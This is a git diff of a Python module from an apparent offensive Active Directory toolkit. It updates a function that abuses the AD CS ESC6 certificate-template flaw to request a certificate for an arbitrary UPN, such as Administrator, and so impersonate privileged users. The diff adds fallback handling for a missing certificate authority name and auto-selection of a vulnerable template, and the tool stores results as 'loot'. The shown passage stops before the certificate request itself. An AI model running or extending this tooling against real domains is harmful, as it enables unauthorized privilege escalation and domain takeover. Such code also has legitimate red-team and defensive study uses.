@@ -2,19 +2,33 @@ import os
 from core.helpers import run_command, save_loot
 from core.colors import blue, green, red, yellow
 
-def abuse_esc6(session, template):
+def abuse_esc6(session, template=None):
     print(blue("[>] ESC6: Abusing SAN override in certificate template to request a certificate for any UPN."))
     print(yellow("[*] This abuse lets you impersonate a privileged user by supplying their UPN in the request."))
 
     cas = session.adcs_metadata.get("cas", [])
     if not cas:
-        print(red("[-] No CA data in session. Run 'adcs enum' first."))
-        return
+        print(yellow("[!] No CA data found in session. Using fallback 'UNKNOWN-CA'."))
+        ca_name = "UNKNOWN-CA"
+    else:
+        ca_name = cas[0].get("name", "").strip()
+        if not ca_name or ca_name.lower() in ["n/a", "none", ""]:
+            print(yellow("[!] CA name is missing or invalid. Using fallback 'UNKNOWN-CA'."))
+            ca_name = "UNKNOWN-CA"
 
-    ca_name = cas[0].get("name")
-    if not ca_name or ca_name.lower() == "n/a":
-        print(red("[-] Invalid CA name in session metadata."))
-        return
+    # === Handle missing or fallback template
+    if not template:
+        print(yellow("[!] No template specified. Trying to auto-select ESC6 template..."))
+        esc6_templates = [t["name"] for t in session.adcs_metadata.get("templates", []) if "ESC6" in t.get("vulns", [])]
+        if esc6_templates:
+            template = esc6_templates[0]
+            print(green(f"[+] Using detected ESC6 template: {template}"))
+        else:
+            print(red("[-] No ESC6 templates found in metadata."))
+            template = input("[?] Enter vulnerable template name manually: ").strip()
+            if not template:
+                print(red("[-] No template provided. Aborting."))
+                return
 
     target_upn = input(f"[?] Enter target UPN (e.g., Administrator@{session.domain}): ").strip()
     if not target_upn or "@" not in target_upn:
